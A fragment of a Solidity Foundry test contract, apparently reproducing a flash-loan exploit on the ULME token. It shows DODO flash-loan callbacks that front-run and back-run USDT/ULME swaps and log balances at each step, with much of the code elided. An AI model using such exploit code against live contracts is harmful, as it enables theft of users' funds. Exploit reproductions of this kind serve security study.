this is a hacker attack called access control 
...
contract Attacker is DSTest {
    ...
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        if(msg.sender == dodo1){
            ...
            emit log_named_decimal_uint("[Callback 1] Attacker USDT Balance after 2nd repay", USDT.balanceOf(address(this)), USDT.decimals());
        }
        if( msg.sender == dodo2){
            emit log_named_decimal_uint("[Callback 2] Attacker USDT Balance at start", USDT.balanceOf(address(this)), USDT.decimals());
            emit log_named_decimal_uint("[Callback 2] Attacker ULME Balance at start", ULME.balanceOf(address(this)), ULME.decimals());

            USDTToULME();

            emit log_named_decimal_uint("[Callback 2] Attacker USDT Balance after frontrun swap", USDT.balanceOf(address(this)), USDT.decimals());
            emit log_named_decimal_uint("[Callback 2] Attacker ULME Balance after frontrun swap", ULME.balanceOf(address(this)), ULME.decimals());
            ...
            emit log_named_decimal_uint("[Callback 2] Attacker USDT Balance after backrun", USDT.balanceOf(address(this)), USDT.decimals());
            emit log_named_decimal_uint("[Callback 2] Attacker ULME Balance after backrun", ULME.balanceOf(address(this)), ULME.decimals());
            USDT.transfer(dodo2, dodo2Balance);
            emit log_named_decimal_uint("[Callback 2] Attacker USDT Balance after 1st repay", USDT.balanceOf(address(this)), USDT.decimals());
        }
    }
